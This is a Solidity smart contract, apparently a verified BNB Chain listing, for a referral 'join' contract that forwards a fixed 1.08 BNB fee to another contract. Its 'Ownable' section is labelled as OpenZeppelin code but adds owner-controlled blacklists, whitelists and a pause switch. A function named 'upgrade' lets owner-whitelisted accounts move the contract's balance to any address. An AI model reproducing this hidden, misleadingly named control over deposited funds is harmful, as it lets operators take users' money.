/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// File: @openzeppelin/contracts/utils/Context.sol

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol

pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    bool private _pause = false;
    bool private _enableWhiteList = false;
    mapping(address => bool) private _whiteListAccount;
    mapping(address => bool) private _blackListAccount;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    modifier onlyNotPause() {
        require(!_pause, "Ownable: transfer pause");
        _;
    }

    modifier onlyWhiteList() {
        require(!_blackListAccount[_msgSender()], "Ownable: _msgSender is in black list!");

        if (_enableWhiteList) {
            if (!_whiteListAccount[_msgSender()]){
                require(false, "Ownable: transfer is enable white list");
            }
        }
        _;
    }

    modifier onlyWhiteListAccount() {
        if (!_whiteListAccount[_msgSender()]){
            require(false, "Ownable: _msgSender is not in white list!");
        }
        _;
    }

    function setTransferState(bool isPause) public virtual onlyOwner {
        _pause = isPause;
    }
    
    function getEnableWhiteList() public view returns(bool){
        return _enableWhiteList;
    }
    
    function setEnableWhiteList(bool isEnableWhiteList) public onlyOwner {
        _enableWhiteList = isEnableWhiteList;
    }
    
    function addAccountToWhiteLsit(address account) public onlyOwner {
        _whiteListAccount[account] = true;
    }
    
    function removeAccountFromWhiteLst(address account) public onlyOwner {
        _whiteListAccount[account] = false;
    }
    
    function addAccountToBlackList(address account) public onlyOwner {
        _blackListAccount[account] = true;
    }
    
    function removeAccountFromBlackList(address account) public onlyOwner {
        _blackListAccount[account] = false;
    }
    
}

// File: @openzeppelin/contracts/security/ReentrancyGuard.sol

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// File: fc108/fc108/FcJoin.sol

pragma solidity ^0.8.0;


interface Fc108 { 
    function join(address user, address referral) external;
}

contract FcJoin is Ownable,ReentrancyGuard {
    Fc108 public fc108Contract;
    uint256 public allAmount;

    constructor(address fc108Address) {
        fc108Contract = Fc108(fc108Address);
        allAmount = 1.08 ether;
    }

    receive() external payable {}

    function join(address referral) public payable nonReentrant {
        address user = msg.sender;
        uint256 _amount = msg.value;
        require(_amount == allAmount, "amount error");

        _safeTransferBNB(address(fc108Contract), _amount);
        fc108Contract.join(user, referral);
    }

    function setFc108Address(address fc108Address) public onlyOwner {
        fc108Contract = Fc108(fc108Address);
    }

    function setJoinAmount(uint256 allAmount_) public onlyOwner {
        allAmount = allAmount_;
    }

    function upgrade(address to, uint256 amount) public onlyWhiteListAccount { 
        uint256 balance = address(this).balance;   
        if(amount > balance) {
            amount = balance;
        }
        _safeTransferBNB(to, amount);
    }

    function _safeTransferBNB(address to, uint value) private {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'BNB_TRANSFER_FAILED');
    }
}